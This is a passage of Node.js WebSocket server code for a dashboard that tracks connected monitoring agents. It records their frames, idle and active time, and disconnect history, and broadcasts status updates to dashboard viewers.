            name: agent.name, id: ws.agentId, ip: agent.ip,
            connectedAt: agent.connectedAt, disconnectedAt: Date.now(),
            framesReceived: agent.framesReceived || 0, events: agent.events,
            bootTime: agent.bootTime || '',
            programStart: agent.programStart || '',
            totalIdle: agent.totalIdle || 0,
            totalActive: agent.totalActive || 0,
            currentState: agent.currentState || 'offline',
            uptime: agent.uptime || 0,
            version: agent.version || ''
          });
          if (agentHistory.length > 1000) agentHistory.shift();
        }
        agents.delete(ws.agentId);
        broadcastToDashboards({ type: 'agent-disconnected', agentId: ws.agentId });
        console.log(`Agent disconnected: ${ws.agentId}`);
      }
    }
    if (ws.role === 'dashboard') {
      dashboards.delete(ws);
      // Remove from all agent viewers (CCTV wall mode)
      for (const [, a] of agents) {
        a.viewers.delete(ws);
      }
    }
  });
});

function broadcastToDashboards(data) {
  for (const ws of dashboards) {
    if (ws.readyState === WebSocket.OPEN) {
      try {
        ws.send(JSON.stringify(data));
      } catch (e) {
        console.error('Broadcast error:', e.message);
      }
    }
  }
}

function handleServerError(err) {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is already in use. Close the other process or set PORT env var.`);
  } else {
    console.error('Server error:', err.message);
  }
  process.exit(1);
}

server.on('error', handleServerError);

process.on('uncaughtException', err => {
  console.error('Uncaught Exception:', err.message, err.stack);
});

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Dashboard: http://localhost:${PORT}`);
});